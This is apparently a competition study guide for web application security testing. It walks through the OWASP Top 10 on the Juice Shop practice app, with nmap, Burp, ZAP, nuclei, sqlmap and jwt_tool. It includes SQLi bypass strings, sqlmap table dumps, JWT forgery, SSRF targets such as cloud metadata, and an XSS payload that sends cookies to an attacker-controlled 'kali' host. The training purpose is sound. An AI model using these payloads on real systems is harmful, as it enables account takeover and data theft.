# 42 — Day 2 (Stage B) — Application Security Testing

**What this file covers:** the **"Application Security"** part of Criterion B's full title (*"Cyber Security Incident Response, Digital Forensics, **Application Security**"*).

**Marks at stake:** part of the ~25 K Crit B pool, mixed in with B1/B2 flag challenges. Specific aspects judging may include:
- Scanning a web app for vulnerabilities
- Writing up findings (severity, CVSS, mitigations)
- Demonstrating exploitation of at least one finding

**Skill level assumed:** none. We'll explain HTTP, web apps, and the OWASP Top 10 in plain English.

**Time:** 60–90 min per practice run. Repeat 3+ times.

---

## What is "Application Security"? (read once)

Most attacks today don't break into your network — they break into your **web app**. Examples: stealing all customer data via SQL injection, posting fake messages via XSS, taking over an account via broken auth.

**Application security testing** = scanning + manually probing a web application to find these flaws **before** the attacker does.

There are 3 ways:
1. **DAST** (Dynamic) — black-box: hit the running app with attacks, see what breaks. **This is what you do in CTF.**
2. **SAST** (Static) — read the source code looking for bugs. Slower, requires source.
3. **IAST** (Interactive) — agent inside the app. Industrial use only.

For competition: **DAST**. We probe the running site.

---

## The OWASP Top 10 (2024) — memorise these names

These are the 10 most common web app vulnerability categories. CTF challenges almost always test one of these.

| # | Category | What it is | One-liner |
|---|---|---|---|
| **A01** | Broken Access Control | Users can do things they shouldn't | "I changed `?id=1` to `?id=2` and saw someone else's data" |
| **A02** | Cryptographic Failures | Data sent in plaintext or weak encryption | "Login form is HTTP, not HTTPS" |
| **A03** | Injection (SQLi, XSS, etc.) | Input not sanitised | "I typed `' OR 1=1 --` and got admin login" |
| **A04** | Insecure Design | Architectural flaws | "No rate limiting on the password reset" |
| **A05** | Security Misconfiguration | Default settings, exposed admin pages | "/admin/ exists with default creds" |
| **A06** | Vulnerable Components | Old libraries with known CVEs | "Apache Struts 2.3 = CVE-2017-5638" |
| **A07** | Auth & Identification Failures | Broken login flows | "Cookie name leaks the user ID" |
| **A08** | Software/Data Integrity Failures | No signature checking | "JS loaded from CDN with no hash check" |
| **A09** | Logging & Monitoring Failures | No alarms when stuff breaks | "Failed login = no log" |
| **A10** | Server-Side Request Forgery (SSRF) | Server fetches URL you control | "I made the server hit `http://169.254.169.254` (AWS metadata)" |

In competition, you'll likely see A01, A03, A05, A06, A07. Practice these first.

---

## Tools you'll use

| Tool | Purpose | Where it lives |
|---|---|---|
| **Burp Suite Community** | Manual testing — proxy, repeater, intruder | Kali (default install) |
| **OWASP ZAP** | Free Burp alternative — automatic scan | Kali |
| **nmap + nmap NSE scripts** | Find web ports + run http-* scripts | Kali |
| **gobuster** / **ffuf** | Find hidden directories + endpoints | Kali |
| **nikto** | Quick all-in-one web scanner | Kali |
| **sqlmap** | Automated SQL injection | Kali |
| **wpscan** / **droopescan** | CMS-specific scanners (WordPress, Drupal) | Kali |
| **CyberChef** | Decode + transform strings | SO web UI / `gchq.github.io/CyberChef` |
| **Postman** / **curl** | Manual API requests | Kali |
| **JWT.io** / **jwt_tool** | JWT inspection + attacks | Kali |
| **nuclei** | Fast template-based scanner | Kali |

---

## The 6-step AppSec methodology (memorise)

| Step | Question | Tool |
|---|---|---|
| **1. Recon** | "What's running on this app?" | nmap, whatweb, wappalyzer |
| **2. Enumerate** | "What endpoints / files / directories exist?" | gobuster, ffuf, robots.txt |
| **3. Map auth** | "How does login work? What roles exist?" | manual exploration |
| **4. Scan** | "Run automated tools against everything" | ZAP, nuclei, nikto |
| **5. Manual probe** | "Test the OWASP Top 10 by hand" | Burp Repeater + Intruder |
| **6. Exploit + report** | "Confirm the vuln + write it up" | sqlmap / curl + report |

---

## Walkthrough 1 — Scan OWASP Juice Shop (you already have this from `05_…`)

Juice Shop is a deliberately vulnerable web app. **Your AppSec sandbox.** Already installed per `05_Setup_JuiceShop.md`.

### Step 1 — Recon

```bash
# What's the IP?
JS=192.168.2.2  # Kali's IP, since Juice Shop runs on Kali at :3000
# OR Juice Shop is on its own VM at 192.168.2.3, etc.

# What's running?
nmap -sV -p- $JS --min-rate 5000

# What's at port 3000?
whatweb http://$JS:3000
curl -I http://$JS:3000
```

**Expected:** Juice Shop banner. The Express + Node.js stack appears in headers.

### Step 2 — Enumerate

```bash
# Find hidden endpoints
gobuster dir -u http://$JS:3000 -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt

# Look at robots.txt
curl http://$JS:3000/robots.txt

# Look for the score-board (deliberately hidden in Juice Shop)
curl http://$JS:3000/#/score-board
```

**Expected:** you discover `/api`, `/rest`, `/api-docs`, etc.

### Step 3 — Set up Burp proxy

1. Kali → Firefox → Settings → Network → Manual proxy → `127.0.0.1:8080` (Burp default).
2. Kali → Burp Suite → Proxy → Intercept ON.
3. Browse to `http://192.168.2.2:3000`.
4. Every request now appears in Burp's HTTP history.

### Step 4 — Run automated scan with ZAP (parallel work)

```bash
# Start ZAP
zaproxy &
```

In ZAP UI:
1. **Quick Start** → URL `http://192.168.2.2:3000` → Attack.
2. ZAP spiders + actively scans for 10–20 min.
3. Review **Alerts** panel: each row = a vulnerability with severity.

### Step 5 — Manual probe — try the OWASP Top 10

#### A01 — Broken Access Control
1. Log in as a normal user (`jim@juice-sh.op` / `ncc-1701`).
2. Note your user ID (in cookie or response).
3. Try changing it to `1` → admin?

#### A03 — SQL Injection
On the login page, try:
```
Email: ' OR 1=1 --
Password: anything
```
Expected: bypass login, log in as the first user (admin).

#### A03 — XSS
Search bar:
```html
<iframe src="javascript:alert('xss')">
```
If alert pops → reflected XSS. Solved.

#### A05 — Security Misconfig
Browse to `/ftp/` — Juice Shop has an exposed FTP-like directory. Try downloading `acquisitions.md`.

#### A07 — Broken Auth (JWT)
1. Log in. Burp shows `Authorization: Bearer <jwt>` header.
2. Copy JWT to https://jwt.io.
3. Read header — algorithm? `RS256`? Try changing to `none`.
4. Re-encode with `none` and `"role":"admin"` payload → submit → admin?

### Step 6 — Solve the score-board challenges

Juice Shop has 100+ scored challenges. The **score-board** ranks them by difficulty (1★ → 6★).

Browse: `http://192.168.2.2:3000/#/score-board`

Start with **1-star** challenges:
1. **Score Board access** — find the page (you just did)
2. **Login Admin** — SQL injection bypass (do this)
3. **Bonus Payload** — easy XSS in search
4. **Confidential document** — file in /ftp/ folder

Each star = harder. Try at least 10 in a 90-min practice session.

---

## Walkthrough 2 — Scan a custom web app with nuclei (15 min target)

If competition gives you a custom web app on a server (not Juice Shop), use **nuclei**:

```bash
# Install (one-time)
sudo apt install -y nuclei

# Update templates
nuclei -update-templates

# Scan a target
nuclei -u http://192.168.1.10 -severity high,critical -o nuclei.txt
```

**Output:** every CVE / misconfig / exposed-panel detected, with severity and the matching template.

This is your "first 5 min" scan against any unfamiliar web app.

---

## Walkthrough 3 — SQLi exploitation with sqlmap (20 min target)

If you find a SQLi point manually, automate exploitation:

```bash
# Test if a parameter is vulnerable
sqlmap -u "http://target.com/products?id=1" --batch

# If YES, list databases
sqlmap -u "http://target.com/products?id=1" --batch --dbs

# Pick a DB, list tables
sqlmap -u "http://target.com/products?id=1" --batch -D appdb --tables

# Pick a table, dump it
sqlmap -u "http://target.com/products?id=1" --batch -D appdb -T users --dump
```

The flag is often a column value in the dumped table.

> 💡 **For login forms** (POST), use:
> ```bash
> sqlmap -u "http://target.com/login" --data="email=test&password=test" --batch
> ```

---

## Walkthrough 4 — JWT attacks with jwt_tool (15 min target)

```bash
# Install
pip3 install jwt-tool

# Decode a JWT
jwt_tool eyJ0eXAiOiJKV1QiLC...

# Test for "none" algorithm
jwt_tool eyJ0eXAi... -X a

# Brute force HMAC secret
jwt_tool eyJ0eXAi... -C -d /usr/share/wordlists/rockyou.txt

# Forge with a discovered secret
jwt_tool eyJ0eXAi... -T -S hs256 -p "secret123"
```

Common JWT challenges:
- "none" algorithm acceptance
- Weak HMAC secret (crack it)
- `kid` header injection
- Expired token still accepted

---

## Walkthrough 5 — XSS to cookie theft (intermediate)

1. Find a reflected XSS:
   ```
   http://target.com/search?q=<script>alert(1)</script>
   ```
2. Replace alert with cookie steal:
   ```html
   <script>fetch('http://kali:8000/?c='+document.cookie)</script>
   ```
3. On Kali, listen:
   ```bash
   python3 -m http.server 8000
   ```
4. Send the link to "victim" (in CTF, organisers run a bot that clicks the link).
5. Cookie appears in your `http.server` log → use it to log in as victim.

---

## Walkthrough 6 — SSRF to internal services (advanced)

If app fetches a URL you control (e.g., "load this image from URL"):
```
http://target.com/fetch?url=http://internal-only:8080/admin
```

Try common internal targets:
- `http://127.0.0.1:8080`
- `http://localhost:6379` (Redis)
- `http://169.254.169.254/latest/meta-data/` (AWS metadata — gold mine)
- `file:///etc/passwd` (file scheme = local read)

---

## Reporting an AppSec finding (the deliverable)

For each vulnerability you find, write:

```
=== APPSEC FINDING ===
TARGET: http://www.manila.com/login
TITLE: SQL injection in email parameter (login bypass)
SEVERITY: Critical (CVSS 9.8)
OWASP: A03 — Injection

DESCRIPTION:
The /login endpoint accepts an `email` parameter that is directly
concatenated into a SQL query without sanitisation, allowing authentication
bypass and admin access.

REPRODUCTION STEPS:
1. Browse to http://www.manila.com/login
2. In the email field, enter:  ' OR 1=1 --
3. In password field, enter any value (e.g., "x")
4. Submit the form

EXPECTED: login fails
ACTUAL: logged in as the first user in the database (admin)

EVIDENCE:
- Screenshot of bypass
- HTTP request/response in Burp

IMPACT:
- Authentication bypass
- Full admin access
- Possible data exfil via UNION-based extraction

MITIGATION:
- Use parameterized queries (prepared statements)
- Input validation: reject non-email-format input
- Add WAF rule blocking SQLi keywords
- Add rate limiting on login

FLAG: flag{sqli_login_bypass}
```

This format works for any finding. Adjust severity, OWASP, mitigations.

---

## Practice routine — AppSec (90 min per session)

| Time | Activity |
|---|---|
| 0:00–0:05 | Boot Juice Shop / target VM / Burp / ZAP |
| 0:05–0:15 | Recon + enumerate |
| 0:15–0:30 | Run nuclei + ZAP automated scan |
| 0:30–1:00 | Manually probe OWASP Top 10 |
| 1:00–1:20 | Exploit at least 1 finding to flag |
| 1:20–1:30 | Write findings report |

---

## Sample challenge sources (build your own AppSec gym)

| Challenge platform | URL | What it covers |
|---|---|---|
| **OWASP Juice Shop** | self-hosted | Full OWASP Top 10 in 1 app — score-board challenges |
| **DVWA** (Damn Vulnerable Web App) | self-hosted | Beginner-friendly OWASP basics |
| **bWAPP** | self-hosted | 100+ vulnerabilities |
| **WebGoat** | self-hosted | Tutorial-style guided learning |
| **PortSwigger Academy** | portswigger.net/web-security | Best free Burp + AppSec training (need internet) |
| **HackTheBox Web tracks** | hackthebox.com | Real-world style challenges |

For practice, prioritize Juice Shop + PortSwigger Academy. They cover 90% of competition styles.

---

## AppSec pitfalls

| Pitfall | Fix |
|---|---|
| Running ZAP scan on production target | Always use the deliberately-vulnerable practice target. NEVER scan unrelated sites |
| Spending 30 min on automated scans before doing recon | Recon first (5 min) → know what you're scanning |
| Not using Burp Repeater | Repeater = the single most useful tab. Tweak one byte, resend, see effect |
| Trying to memorize all 100 Juice Shop challenges | Memorize patterns, not specifics. The pattern repeats |
| Submitting flag without reproduction proof | Marks may require reproduction screenshot |

---

## Cheat sheet

```
APPSEC FAST TRIAGE (5 min)
───────────────────────────
1. nmap -sV -p- <target>
2. whatweb http://<target>
3. curl -I http://<target>      # headers
4. gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt
5. open Burp → browse the app → review HTTP History

OWASP TOP 10 PROBES
────────────────────
A01 (Access Control):  change ?id=1 → ?id=2  on every endpoint
A03 (SQLi):            ' OR 1=1 --
A03 (XSS):             <script>alert(1)</script>
A05 (Misconfig):       /admin /backup /.git /robots.txt
A06 (CVE):             nuclei -u http://<target>
A07 (JWT):             jwt_tool <token>; try alg=none
A10 (SSRF):            ?url=http://127.0.0.1:80

KEY BURP SHORTCUTS
───────────────────
Ctrl+R  → send request to Repeater
Ctrl+I  → send to Intruder
Ctrl+B  → 64 encode/decode
Ctrl+U  → URL encode/decode
```

---

## What you've learned by end of this file

✅ The OWASP Top 10 categories
✅ DAST workflow with Burp Suite + ZAP
✅ Recon + enum with nmap, gobuster, whatweb
✅ Quick scanning with nuclei
✅ SQLi exploitation with sqlmap
✅ XSS to cookie theft pattern
✅ JWT attacks with jwt_tool
✅ SSRF to internal services
✅ How to write a structured AppSec finding

---

End of file. Day 2 trio (40_, 41_, 42_) all complete — together they cover Crit B's 25 marks.
